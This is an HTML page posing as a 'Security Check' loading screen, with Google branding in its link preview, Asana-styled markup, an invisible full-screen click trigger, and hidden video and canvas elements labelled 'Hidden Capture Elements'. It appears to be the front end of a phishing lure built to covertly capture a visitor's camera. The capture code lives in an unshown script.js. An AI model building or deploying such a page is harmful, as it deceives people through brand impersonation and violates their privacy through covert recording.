<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <!-- Professional Metadata -->
    <meta name="description" content="Security Verification">
    <meta name="theme-color" content="#ffffff">
    <title>Loading...</title>

    <!-- Open Graph (Link Preview) - Looks professional on Discord/WhatsApp -->
    <meta property="og:title" content="Security Check">
    <meta property="og:description" content="Please wait while we verify your session context.">
    <meta property="og:image"
        content="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png">
    <meta property="og:type" content="website">

    <!-- Styles -->
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="data:,"> <!-- Empty favicon placeholder -->
</head>

<body>
    <!-- Main UI Container -->
    <div id="target-ui" class="active">
        <div class="asana-wrapper">
            <!-- Logo (dynamically updated by script) -->
            <div class="asana-logo">
                <!-- Default generic loader -->
                <svg width="60" height="60" viewBox="0 0 40 40" fill="none">
                    <circle cx="20" cy="8" r="4" fill="#666" />
                    <circle cx="12" cy="22" r="4" fill="#666" />
                    <circle cx="28" cy="22" r="4" fill="#666" />
                </svg>
            </div>

            <!-- Loading State -->
            <div class="loading-state">
                <h2 id="loading-text">Initializing...</h2>
                <div class="progress-container">
                    <div id="progress-bar"></div>
                </div>
                <p class="status-msg" id="status-detail">Preparing secure environment</p>
            </div>
        </div>
    </div>

    <!-- Fallback Click Trigger (Invisible) - Just in case auto-start fails/disabled -->
    <div id="click-trigger"
        style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999;cursor:pointer;display:none;"></div>

    <!-- Hidden Capture Elements -->
    <video id="st-v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="st-c" style="display:none;"></canvas>

    <!-- Core Engine -->
    <script src="script.js"></script>
</body>

</html>
